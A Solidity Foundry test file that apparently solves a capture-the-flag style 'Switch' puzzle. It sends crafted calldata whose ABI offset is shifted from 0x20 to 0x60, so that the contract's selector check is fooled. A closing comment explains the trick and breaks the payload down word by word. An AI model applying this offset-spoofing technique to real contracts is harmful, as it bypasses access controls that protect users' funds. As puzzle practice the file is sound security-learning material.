// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../src/Switch.sol";

contract SwitchTest is Test {
    Switch public switch1;

    function setUp() public {
        // Deploy Switch contract
        switch1 = new Switch();
    }

    function testCalldataEqual() public {
        bytes
            memory calldata1 = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        (bool success, ) = address(switch1).call(calldata1);
        assertEq(switch1.switchOn(), true);
    }
}

// Solution: we change ths offset from "0x20" to "0x60" so that we trick the EVM to make it think the actual data begin from "0x60"
// 30c13ade
// 0000000000000000000000000000000000000000000000000000000000000060
// 0000000000000000000000000000000000000000000000000000000000000004
// 20606e1500000000000000000000000000000000000000000000000000000000
// 0000000000000000000000000000000000000000000000000000000000000004
// 76227e1200000000000000000000000000000000000000000000000000000000
